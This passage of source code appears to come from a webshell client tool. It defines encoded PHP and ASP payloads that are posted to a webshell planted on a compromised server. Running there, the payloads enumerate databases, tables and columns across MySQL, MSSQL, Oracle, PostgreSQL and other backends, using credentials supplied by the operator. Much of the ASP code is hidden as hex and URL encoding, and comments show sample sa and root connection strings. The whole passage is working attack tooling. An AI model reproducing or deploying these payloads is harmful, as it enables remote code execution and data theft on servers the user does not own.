		"z2\"]):$_POST[\"z2\"];$d=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$u=$m?stripslashes($_POST[\""
		"z4\"]):$_POST[\"z4\"];$p=$m?stripslashes($_POST[\"z5\"]):$_POST[\"z5\"];$l=@pg_connect(\"host=$h po"
		"rt=$s dbname=$d user=$u password=$p\");$q=@pg_query($l,\"SELECT DISTINCT schemaname FROM pg_tables;\""
		");while($rs=@pg_fetch_row($q,$i)){echo(trim($rs[0]).chr(9));}@pg_close($l);exit(\"|<-\");") + "&z1=";

	szDataPhpODBC_MSSQL	=	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m="
		"get_magic_quotes_gpc();$d=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$u=$m?stripslashes($_POST[\""
		"z2\"]):$_POST[\"z2\"];$p=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$l=@odbc_connect(\"$d\",\"$"
		"u\",\"$p\");$q=@odbc_exec($l,\"select [name] from master.dbo.sysdatabases order by 1\");while(@odbc_"
		"fetch_row($q)){echo(odbc_result($q,1).chr(9));}@odbc_free_result($q);@odbc_close($l);exit(\"|<-\");") + "&z1=";

	szDataPhpPDO_MYSQL	=	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m=get_magic_quotes_gpc();"
		"$h=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
		"$u=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
		"$p=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
		"try{$dbh=new PDO(\"mysql:host=$h\",\"$u\",\"$p\");"
		"foreach($dbh->query(\"SHOW DATABASES\") as $r){echo $r[0].\"\\t\";}"
		"$dbh=null;}catch(PDOException $e){echo \"ERROR://\".$e->getMessage();}exit(\"|<-\");") + "&z1=";

	szDataPhpPDO_MSSQL	=	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m=get_magic_quotes_gpc();"
		"$h=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
		"$u=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
		"$p=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
		"try{$dbh=new PDO(\"odbc:Driver={SQL Server};Server=$h\",\"$u\",\"$p\");"
		"foreach($dbh->query(\"select [name] from master.dbo.sysdatabases order by 1\") as $r){echo $r[0].\"\\t\";}"
		"$dbh=null;}catch(PDOException $e){echo \"ERROR://\".$e->getMessage();}exit(\"|<-\");") + "&z1=";
	//////////////////////////////////////////////////////////////////////////
	szDataAspSqlServer =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+"
		"Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExe"
		"cute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AEx"
		"ecute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%"
		"22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Wri"
		"te(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53493D22223A53657420436"
		"F6E6E3D5365727665722E4372656174654F626A656374282241646F64622E636F6E6E656374696F6E22293A44696D2053493"
		"A436F6E6E2E4F70656E206264285265717565737428227A312229293A496620457272205468656E3A53493D224552524F523"
		"A2F2F2022264572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A5365742052733D4372656174654"
		"F626A656374282241646F64622E5265636F726473657422293A52732E6F70656E202273656C656374205B6E616D655D20667"
		"26F6D206D61737465722E64626F2E737973646174616261736573206F726465722062792031222C436F6E6E2C312C313A496"
		"620457272205468656E3A53493D224552524F523A2F2F2022264572722E4465736372697074696F6E3A4572722E436C65617"
		"23A456C73653A446F205768696C65204E6F742852732E456F66204F722052732E426F66293A53493D5349265273283029266"
		"368722839293A52732E4D6F76654E6578743A4C6F6F703A52732E436C6F73653A456E642049663A5365742052733D4E6F746"
		"8696E673A436F6E6E2E436C6F73653A456E642049663A53657420436F6E6E3D4E6F7468696E673A526573706F6E73652E577"
		"269746528534929\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";
		//4472697665723D7B53716C205365727665727D3B5365727665723D286C6F63616C293B44617461626173653D6D61737465723B5569643D73613B5077643D
		//<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>

	szDataAsp1 =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+"
		"Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExe"
		"cute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AEx"
		"ecute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%"
		"22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Wri"
		"te(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53493D22223A53657420436"
		"F6E6E3D5365727665722E4372656174654F626A656374282241646F64622E636F6E6E656374696F6E22293A44696D2053493"
		"A436F6E6E2E4F70656E206264285265717565737428227A312229293A496620457272205468656E3A53493D224552524F523"
		"A2F2F2022264572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A53493D225B41444F20444154414"
		"24153455D22266368722839293A436F6E6E2E436C6F73653A456E642049663A53657420436F6E6E3D4E6F7468696E673A526"
		"573706F6E73652E577269746528534929\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";
		/*
		44736E3D44736E4E616D653B		Dsn=DsnName;
		<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
		<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
		<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
		<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
		<C>Dsn=DsnName;</C>
		*/
	szDataAsp2 =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2"
		"%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd"
		"%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd"
		"%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3A"
		"End+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Execute(\"\""
		"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53493D22223A53657420436F6E6E3D5365727665722E4372656174654F626A65637"
		"4282241646F64622E636F6E6E656374696F6E22293A44696D2053493A436F6E6E2E4F70656E206264285265717565737428227"
		"A312229293A496620457272205468656E3A53493D224552524F523A2F2F2022264572722E4465736372697074696F6E3A45727"
		"22E436C6561723A456C73653A53493D5265717565737428227A322229266368722839293A436F6E6E2E436C6F73653A456E642"
		"049663A53657420436F6E6E3D4E6F7468696E673A526573706F6E73652E577269746528534929\"\"\"\")):Response.Write"
		"(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";
		//4472697665723D7B4D6963726F736F66742041636365737320447269766572282A2E6D6462297D3B4442513D633A5C746573742E6D6462&z2=test.mdb
		//Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb&z2=test.mdb
		//////////////////////////////////////////////////////////////////////////
	szDataAspxSqlServer =	Ini_szASPX_POST_DATA + "&z1=";
		//RHJpdmVyPXtTcWwgU2VydmVyfTtTZXJ2ZXI9KGxvY2FsKTtEYXRhYmFzZT1tYXN0ZXI7VWlkPXNhO1B3ZD0%3D
		//Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=
		//<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=</C>

	szDataAspx1 =	Ini_szASPX_POST_DATA + "&z1=";
		/*
		RHNuPURzbk5hbWU7		Dsn=DsnName;
		<C>Provider=SQLOLEDB.1;User ID=sa;Password=;Initial Catalog=master;Data Source=(local);</C>
		<C>Provider=SQLOLEDB.1;Initial Catalog=master;Data Source=(local);Integrated Security=SSPI;</C>
		<C>Driver={MySQL};Server=localhost;database=mysql;UID=root;PWD=</C>
		<C>Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;</C>
		<C>Dsn=DsnName;</C>
		*/
	szDataAspx2 =	Ini_szASPX_POST_DATA + "&z1=";
		//RHJpdmVyPXtNaWNyb3NvZnQgQWNjZXNzIERyaXZlcigqLm1kYil9O0RCUT1jOlx0ZXN0Lm1kYg%3D%3D&z2=test.mdb
		//Driver={Microsoft Access Driver(*.mdb)};DBQ=c:\test.mdb&z2=test.mdb
		//////////////////////////////////////////////////////////////////////////												以上，获取数据库。下面，获取Table
	szDataTablePhpMysql =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$usr=$m?stripslashes($_P"
		"OST[\"z2\"]):$_POST[\"z2\"];$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$dbn=$m?stripslashes"
		"($_POST[\"z4\"]):$_POST[\"z4\"];$T=@mysql_connect($hst,$usr,$pwd);$q=@mysql_query(\"SHOW TABLES FROM"
		" `{$dbn}`\");while($rs=@mysql_fetch_row($q)){echo(trim($rs[0]).chr(9));}@mysql_close($T);;echo(\"|<-"
		"\");die();") + "&z1=";

	szDataTablePhpMssql		=	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$usr=$m?stripslashes($_P"
		"OST[\"z2\"]):$_POST[\"z2\"];$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$dbn=$m?stripslashes"
		"($_POST[\"z4\"]):$_POST[\"z4\"];$T=@mssql_connect($hst,$usr,$pwd);@mssql_select_db($dbn,$T);$q=@mssq"
		"l_query(\"SELECT [name] FROM sysobjects WHERE (xtype='U' OR xtype='S') ORDER BY 1\",$T);while($rs=@m"
		"ssql_fetch_row($q)){echo(trim($rs[0]).chr(9));}@mssql_free_result($q);@mssql_close($T);;echo(\"|<-\""
		");die();") + "&z1=";
	szDataTablePhpOracle	=	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$usr=$m?stripslashes($_P"
		"OST[\"z2\"]):$_POST[\"z2\"];$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$dbn=$m?stripslashes"
		"($_POST[\"z4\"]):$_POST[\"z4\"];$H=@ora_plogon(\"{$usr}@{$sid}\",\"{$pwd}\");if(!$H){echo(\"ERROR://"
		" Login Failed!\");}else{$T=@ora_open($H);@ora_commitoff($H);$q=@ora_parse($T,\"SELECT TABLE_NAME FRO"
		"M (SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='{$dbn}' ORDER BY 1)\");if(ora_exec($T)){while(ora_"
		"fetch($T)){echo(trim(ora_getcolumn($T,0)).chr(9));}}@ora_close($T);};echo(\"|<-\");die();") + "&z1=";
	szDataTablePhpInformix	=	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$usr=$m?stripslashes($_P"
		"OST[\"z2\"]):$_POST[\"z2\"];$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$dbn=$m?stripslashes"
		"($_POST[\"z4\"]):$_POST[\"z4\"];$T=(strlen($usr)>0)?@ifx_connect($hst,$usr,$pwd):@ifx_connect($hst);"
		"$q=@ifx_query(\"SELECT tabname FROM systables where owner='{$dbn}' and tabtype='T' ORDER BY tabname\""
		",$T);while($rs=@ifx_fetch_row($q)){echo(trim($rs[tabname]).chr(9));}@ifx_close($T);;echo(\"|<-\");d"
		"ie();") + "&z1=";

	szDataTablePhpPostgreSQL =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m="
		"get_magic_quotes_gpc();$h=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$s=$m?stripslashes($_POST[\""
		"z2\"]):$_POST[\"z2\"];$d=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$u=$m?stripslashes($_POST[\""
		"z4\"]):$_POST[\"z4\"];$p=$m?stripslashes($_POST[\"z5\"]):$_POST[\"z5\"];$b=$m?stripslashes($_POST[\""
		"z6\"]):$_POST[\"z6\"];$l=@pg_connect(\"host=$h port=$s dbname=$d user=$u password=$p\");$q=@pg_quer"
		"y($l,\"SELECT tablename FROM pg_tables WHERE schemaname='$b';\");while($rs=@pg_fetch_row($q,$i)){ech"
		"o(trim($rs[0]).chr(9));}@pg_close($l);exit(\"|<-\");") + "&z1=";

	szDataTablePhpODBC_MSSQL	=	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m="
		"get_magic_quotes_gpc();$d=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$u=$m?stripslashes($_POST[\""
		"z2\"]):$_POST[\"z2\"];$p=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$b=$m?stripslashes($_POST[\""
		"z4\"]):$_POST[\"z4\"];$l=@odbc_connect(\"$d\",\"$u\",\"$p\");$q=@odbc_exec($l,\"USE $b;SELECT [name"
		"] FROM sysobjects WHERE (xtype='U' OR xtype='S') ORDER BY 1\");while(@odbc_fetch_row($q)){echo(odbc_"
		"result($q,1).chr(9));}@odbc_free_result($q);@odbc_close($l);exit(\"|<-\");") + "&z1=";

	szDataTablePhpPDO_MYSQL	=	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m=get_magic_quotes_gpc();"
		"$h=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
		"$u=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
		"$p=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
		"$d=$m?stripslashes($_POST[\"z4\"]):$_POST[\"z4\"];"
		"try{$dbh=new PDO(\"mysql:host=$h;dbname=$d\",\"$u\",\"$p\");"
		"foreach($dbh->query(\"SHOW TABLES\") as $r){echo $r[0].\"\\t\";}"
		"$dbh=null;}catch(PDOException $e){echo \"ERROR://\".$e->getMessage();}exit(\"|<-\");") + "&z1=";

	szDataTablePhpPDO_MSSQL	=	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m=get_magic_quotes_gpc();"
		"$h=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];"
		"$u=$m?stripslashes($_POST[\"z2\"]):$_POST[\"z2\"];"
		"$p=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];"
		"$d=$m?stripslashes($_POST[\"z4\"]):$_POST[\"z4\"];"
		"try{$dbh=new PDO(\"odbc:Driver={SQL Server};Server=$h;Database=$d\",\"$u\",\"$p\");"
		"foreach($dbh->query(\"SELECT [name] FROM sysobjects WHERE (xtype='U' OR xtype='S') ORDER BY 1\") as $r){echo $r[0].\"\\t\";}"
		"$dbh=null;}catch(PDOException $e){echo \"ERROR://\".$e->getMessage();}exit(\"|<-\");") + "&z1=";
	//////////////////////////////////////////////////////////////////////////												以上PHP获取Table
	szDataTableAspSqlServer =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+"
		"2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3"
		"Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2"
		"B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Exec"
		"ute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53493D22223A53657420436F6E6E3D5365727665722E4372656174654"
		"F626A656374282241646F64622E636F6E6E656374696F6E22293A44696D2053493A436F6E6E2E4F70656E202222266264285"
		"265717565737428227A312229292622223A496620457272205468656E3A53493D224552524F523A2F2F2022264572722E446"
		"5736372697074696F6E3A4572722E436C6561723A456C73653A5365742052733D436F6E6E2E4578656375746528225553452"
		"05B22265265717565737428227A32222926225D3B53454C454354205B6E616D655D2046524F4D207379736F626A656374732"
		"05748455245202878747970653D27552729204F52444552204259203122293A496620457272205468656E3A53493D2245525"
		"24F523A2F2F2022264572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A446F205768696C65204E6"
		"F742852732E456F66204F722052732E426F66293A53493D5349265273283029266368722839293A52732E4D6F76654E65787"
		"43A4C6F6F703A456E642049663A5365742052733D4E6F7468696E673A436F6E6E2E436C6F73653A456E642049663A5365742"
		"0436F6E6E3D4E6F7468696E673A526573706F6E73652E577269746528534929\"\"\"\")):Response.Write(\"\"\"\"|<-"
		"\"\"\"\"):Response.End\"\")\")&z1=";
	//4472697665723D7B53716C205365727665727D3B5365727665723D3137322E31362E31302E34393B44617461626173653D6771745F6A786A643B5569643D73613B5077643D53514C736572766572
	//&z2=test
	//&z3=Set+Conn%3DServer.CreateObject%28%22Adodb.connection%22%29%3ADim+SI%3AConn.Open+%22%22%26bd%28Request%28%22z1%22%29%29%26%22%22%3AIf+Err+Then%3ASI%3D%22ERROR
	//%3A%2F%2F+%22%26Err.Description%3AErr.Clear%3AElse%3ASet+Rs%3DConn.OpenSchema%2820%29%3ARs.MoveFirst%3ASI%3D%22%22%3ADo+While+Not+Rs.Eof%3AIf+Rs%28%22TABLE_TYPE
	//%22%29%3D%22TABLE%22+Then%3ASI%3DSI%26Rs%28%22TABLE_NAME%22%29%26chr%%289%29%3AEnd+If%3ARs.MoveNext%3ALoop%3ASet+Rs%3DNothing%3AConn.Close%3AEnd+If%3ASet+Conn%3DNothing
	//%3AResponse.Write%28SI%29
	//&z4=4472697665723D7B53716C205365727665727D3B5365727665723D3137322E31362E31302E34393B44617461626173653D6771745F6A786A643B5569643D73613B5077643D53514C736572766572
	szDataTableAsp1 =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+"
		"2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3"
		"Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2"
		"B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Exec"
		"ute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53493D22223A53657420436F6E6E3D5365727665722E4372656174654"
		"F626A656374282241646F64622E636F6E6E656374696F6E22293A44696D2053493A436F6E6E2E4F70656E202222266264285"
		"265717565737428227A312229292622223A496620457272205468656E3A53493D224552524F523A2F2F2022264572722E446"
		"5736372697074696F6E3A4572722E436C6561723A456C73653A5365742052733D436F6E6E2E4F70656E536368656D6128323"
		"0293A52732E4D6F766546697273743A53493D22223A446F205768696C65204E6F742052732E456F663A49662052732822544"
		"1424C455F5459504522293D225441424C4522205468656E3A53493D534926527328225441424C455F4E414D4522292663687"
		"22839293A456E642049663A52732E4D6F76654E6578743A4C6F6F703A5365742052733D4E6F7468696E673A436F6E6E2E436"
		"C6F73653A456E642049663A53657420436F6E6E3D4E6F7468696E673A526573706F6E73652E577269746528534929\"\"\"\""
		")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";
	//50726F76696465723D53514C4F4C4544422E313B557365722049443D73613B50617373776F72643D53514C7365727665723B496E697469616C20436174616C6F673D6771745F6A786A643B4461746120536F757263653D3137322E31362E31302E34393B
	szDataTableAsp2 =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+"
		"2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3"
		"Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2"
		"B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Exec"
		"ute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53493D22223A53657420436F6E6E3D5365727665722E4372656174654"
		"F626A656374282241646F64622E636F6E6E656374696F6E22293A44696D2053493A436F6E6E2E4F70656E202222266264285"
		"265717565737428227A312229292622223A496620457272205468656E3A53493D224552524F523A2F2F2022264572722E446"
		"5736372697074696F6E3A4572722E436C6561723A456C73653A5365742052733D436F6E6E2E4F70656E536368656D6128323"
		"0293A52732E4D6F766546697273743A53493D22223A446F205768696C65204E6F742052732E456F663A49662052732822544"
		"1424C455F5459504522293D225441424C4522205468656E3A53493D534926527328225441424C455F4E414D4522292663687"
		"22839293A456E642049663A52732E4D6F76654E6578743A4C6F6F703A5365742052733D4E6F7468696E673A436F6E6E2E436"
		"C6F73653A456E642049663A53657420436F6E6E3D4E6F7468696E673A526573706F6E73652E577269746528534929\"\"\"\""
		")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";//Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\www\db.mdb
		//////////////////////////////////////////////////////////////////////////
	szDataTableAspxSqlServer =	Ini_szASPX_POST_DATA + "&z1=";
	szDataTableAspx1 =	Ini_szASPX_POST_DATA + "&z1=";
	szDataTableAspx2 =	Ini_szASPX_POST_DATA + "&z1=";
		//&z1=Provider=Microsoft.Jet.OLEDB.4.0;Data Source=c:\www\db.mdb
		//////////////////////////////////////////////////////////////////////////												php 获取Columns
	szDataColumnsPhpMysql =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$usr=$m?stripslashes($_P"
		"OST[\"z2\"]):$_POST[\"z2\"];$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$dbn=$m?stripslashes"
		"($_POST[\"z4\"]):$_POST[\"z4\"];$tab=$m?stripslashes($_POST[\"z5\"]):$_POST[\"z5\"];$T=@mysql_connec"
		"t($hst,$usr,$pwd);@mysql_select_db($dbn);$q=@mysql_query(\"SHOW COLUMNS FROM `{$tab}`\");while($rs=@"
		"mysql_fetch_row($q)){echo(trim($rs[0]).\" (\".$rs[1].\")\".chr(9));}@mysql_close($T);;echo(\"|<-\");"
		"die();") + "&z1=";//localhost&z2=root&z3=root&z4=test&z5=aa
	szDataColumnsPhpMssql =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$usr=$m?stripslashes($_P"
		"OST[\"z2\"]):$_POST[\"z2\"];$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$dbn=$m?stripslashes"
		"($_POST[\"z4\"]):$_POST[\"z4\"];$tab=$m?stripslashes($_POST[\"z5\"]):$_POST[\"z5\"];$T=@mssql_connec"
		"t($hst,$usr,$pwd);@mssql_select_db($dbn,$T);$q=@mssql_query(\"SELECT TOP 1 * FROM {$tab}\",$T);whil"
		"e($rs=@mssql_fetch_field($q)){echo(trim($rs->name).\" (\".$rs->type.\")\".chr(9));}@mssql_free_resul"
		"t($q);@mssql_close($T);;echo(\"|<-\");die();") + "&z1=";
	szDataColumnsPhpOracle =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$usr=$m?stripslashes($_P"
		"OST[\"z2\"]):$_POST[\"z2\"];$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$tab=$m?stripslashes"
		"($_POST[\"z4\"]):$_POST[\"z4\"];$H=@ora_plogon(\"{$usr}@{$sid}\",\"{$pwd}\");if(!$H){echo(\"ERROR://"
		" Login Failed!\");}else{$T=@ora_open($H);@ora_commitoff($H);$q=@ora_parse($T,\"SELECT COLUMN_NAME,DA"
		"TA_TYPE FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='{$tab}' ORDER BY COLUMN_ID\");if(ora_exec($T)){while("
		"ora_fetch($T)){echo(trim(ora_getcolumn($T,0)).\" (\".ora_getcolumn($T,1).\")\".chr(9));}}@ora_close("
		"$T);};echo(\"|<-\");die();") + "&z1=";
	szDataColumnsPhpInformix =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$usr=$m?stripslashes($_P"
		"OST[\"z2\"]):$_POST[\"z2\"];$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$tab=$m?stripslashes"
		"($_POST[\"z4\"]):$_POST[\"z4\"];$T=(strlen($usr)>0)?@ifx_connect($hst,$usr,$pwd):@ifx_connect($hst);"
		"$q=@ifx_query(\"SELECT first 1 * FROM {$tab}\",$T);if($rs=@ifx_fieldtypes($q)){for($i=0;$fn=key($rs)"
		";next($rs),$i++){echo(trim($fn).\" (\".$rs[$fn].\")\".chr(9));}}@ifx_close($T);;echo(\"|<-\");die();"
		"") + "&z1=";

	szDataColumnsPhpPostgreSQL =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m="
		"get_magic_quotes_gpc();$h=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$s=$m?stripslashes($_POST[\""
		"z2\"]):$_POST[\"z2\"];$d=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$u=$m?stripslashes($_POST[\""
		"z4\"]):$_POST[\"z4\"];$p=$m?stripslashes($_POST[\"z5\"]):$_POST[\"z5\"];$b=$m?stripslashes($_POST[\""
		"z6\"]):$_POST[\"z6\"];$t=$m?stripslashes($_POST[\"z7\"]):$_POST[\"z7\"];$l=@pg_connect(\"host=$h po"
		"rt=$s dbname=$d user=$u password=$p\");$q=@pg_query($l,\"SELECT column_name FROM information_schema."
		"columns WHERE table_schema='$b' AND table_name='$t';\");while($rs=@pg_fetch_row($q,$i)){echo(trim($r"
		"s[0]).chr(9));}@pg_close($l);exit(\"|<-\");") + "&z1=";

	szDataColumnsPhpODBC_MSSQL	=	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m="
		"get_magic_quotes_gpc();$d=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$u=$m?stripslashes($_POST[\""
		"z2\"]):$_POST[\"z2\"];$p=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$b=$m?stripslashes($_POST[\""
